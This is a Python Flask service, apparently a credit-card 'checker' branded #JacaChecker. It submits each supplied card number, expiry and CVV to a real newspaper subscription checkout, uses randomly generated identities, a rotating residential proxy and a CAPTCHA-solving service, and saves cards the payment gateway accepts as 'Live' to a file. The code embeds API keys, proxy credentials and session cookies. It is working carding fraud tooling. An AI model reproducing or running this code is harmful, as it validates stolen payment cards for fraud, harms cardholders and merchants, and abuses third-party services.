import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
import http.client
import threading, requests, random, time, random, re
from urllib3 import disable_warnings
from colorama import Fore


disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def pegarItem(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

def criarTask():
        data = {
            "clientKey": "409154ed879c9e41c25703a6f92289bd",
            "task": {
                "type": "RecaptchaV2EnterpriseTask",
                "websiteURL": "https://holdmyticket.com/api/shop/processors/logme2342311",
                "websiteKey": "6Lf7DLEZAAAAACWoTmGDsOAzTTwXshPMYKQMcrxK",
            },
        }
        criar = requests.post(
            "https://api.capmonster.cloud/createTask", verify=False, json=data
        )
        taskId = criar.json()["taskId"]
        while True:
            data = {"clientKey": "409154ed879c9e41c25703a6f92289bd", "taskId": taskId}
            resultado = requests.post(
                "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
            )
            #print(resultado.text)
            if '"status":"ready"' in resultado.text:
                return resultado.json()["solution"]["gRecaptchaResponse"]
            time.sleep(1)


def api_bin(bin):
    try:
        req = requests.get(
            f"https://parrotv2.prod.pagosapi.com/cards?bin={bin}",
            headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["card"]["type"]
                nivel = req.json()["card"]["product"]["product_name"]
                banco = req.json()["card"]["bank"]["name"]
                try:
                    pais = req.json()["card"]["country"]["name"]
                except:
                    pais = "N/A"
                return f"{nivel} {tipo} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    

class RequisicaoException(Exception):
    def __init__(self):
        super().__init__()


def reteste(card, month, year, cvv):
        checker(card, month, year, cvv)



def definir_tipo_cartao(card):
    if card.startswith("4"):
        return "VISA"
    elif card.startswith(("51", "52", "53", "54", "55")):
        return "MASTER"
    elif card.startswith(("34", "37")):
        return "American Express"
    elif card.startswith("6"):
        return "Discover"
    else:
        return "Desconhecido"
    

    
    
    
def checker(card, month, year, cvv):
        
        
        

            
        try:
            
        

            #p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
            headers = {
                    'Host': 'randomuser.me',
                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                    'sec-ch-ua-platform': '"Windows"',
                    'origin': 'https://namso-gen.com',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://namso-gen.com/',
                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                    }

            response = requests.get( url, headers=headers, verify=False)
            email = pegarItem(response.text, '"email":"','"')
            nome = pegarItem(response.text, '"first":"','"')
            sobrenome = pegarItem(response.text, '"last":"','"')
            street = pegarItem(response.text, '"name":"','"},"city"')
            snumber = pegarItem(response.text, '"street":{"number":',',')
            city = pegarItem(response.text, '"city":"','"')
            state = pegarItem(response.text, '"state":"','"')
            postcode = pegarItem(response.text, '"postcode":',',')
            company = pegarItem(response.text, '"username":"','"')
            tel = random.randint(00000,99999)
            
   
          

            
            if response.status_code == 200:
                time.sleep(5)
                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
                start_time = time.time() 

                
                
                url = "https://timberjay.creativecirclemedia.com/subscribe/"

                payload = {}
                headers = {
                'Host': 'timberjay.creativecirclemedia.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://timberjay.creativecirclemedia.com/account/',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': '_ga=GA1.1.2107239214.1712781430; MEDIASITEQ=7ttprhgvtc3adnspjs356pfjkr; cq_user_id=6598; _ga_WPLJXE6REZ=GS1.1.1712781430.1.1.1712781666.0.0.0'
                }

                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
                token = pegarItem(response.text, "<input type='hidden' name='csrf_token' value='","'>")
                
                
                
                
                url = "https://timberjay.creativecirclemedia.com/subscribe/?"

                payload = f'process=checkout&rate=57&price=118.00&promo=&content=&content_id=&referer=&subscriber_number=&payee_note=&quantity=&csrf_token={token}&firstname=james&lastname=deamn&street=3065%20Tradeport%20Dr&street2=209315&city=Orlando&state=FL&zip=32824&title=mr&company=mr&phone=8013006333&email=9cu324hfvc98743%40gmail.com&billing_same=1&billing_state=FL&cc_number={card}&cc_expires_month={month}&cc_expires_year={year}&cc_cvv=021'
                headers = {
                'Host': 'timberjay.creativecirclemedia.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://timberjay.creativecirclemedia.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://timberjay.creativecirclemedia.com/subscribe/',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': '_ga=GA1.1.2107239214.1712781430; MEDIASITEQ=7ttprhgvtc3adnspjs356pfjkr; cq_user_id=6598; _ga_WPLJXE6REZ=GS1.1.1712781430.1.1.1712781674.0.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }

                response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
                            
                
                
                time.sleep(4)
                
                    
                    
                elapsed_time = time.time() - start_time
                
                MSegundos = round(elapsed_time, 2)
            
                    
                    
                if 'avs' in response.text:
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
                    print(Fore.GREEN + f"{x} #JacaChecker")     
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
                
                elif 'Insufficient funds' in response.text:
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                        
                elif 'An error occurred during processing' in response.text:
                    bin = api_bin(card[:6])              
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
                    open("newzware.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                            

                    
                elif 'alert alert-danger' in response.text:  
                    code = pegarItem(response.text, '<div class="alert alert-danger text-center">','</div>')
                    bin = api_bin(card[:6])
                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {code} [{MSegundos}] MS"     
                    print(Fore.RED + f"{x} #JacaChecker")  
                    return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                    
                    
                else:
                    
                    print(Fore.RED + 'Gateway Timeout' + response.text)
                    return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                
                    
                    

                        

                    
        except requests.exceptions.ProxyError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except requests.exceptions.RequestException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
        except RequisicaoException:
            print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
            reteste(card, month, year, cvv)
            
            


def processar_cartoes(card,mes,ano,cvv):
    try:
        if len(card) == 16 or len(card) == 15 and mes and ano and cvv:
            retorno = checker(card,mes,ano,cvv)
            return {"code": retorno["code"], "retorno": retorno["mensagem"]}
        else:
            return {"code": "", "retorno": "erro no formulario"}
    except:
        #retorno = checker(card,mes,ano,cvv)
        return {"code": "", "retorno": "Exception"}
    
    

            
            
@app.route('/', methods=['GET'])
def iniciarChk():
    return "@Engenieiro"


@app.route('/chk', methods=['GET'])
def chk():
    args = request.args
    print(args)
    card = args.get('card')
    mes = args.get('mes')
    ano = args.get('ano')
    cvv = args.get('cvv')
    return jsonify(processar_cartoes(card,mes,ano,cvv))



if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
    
    
    
    

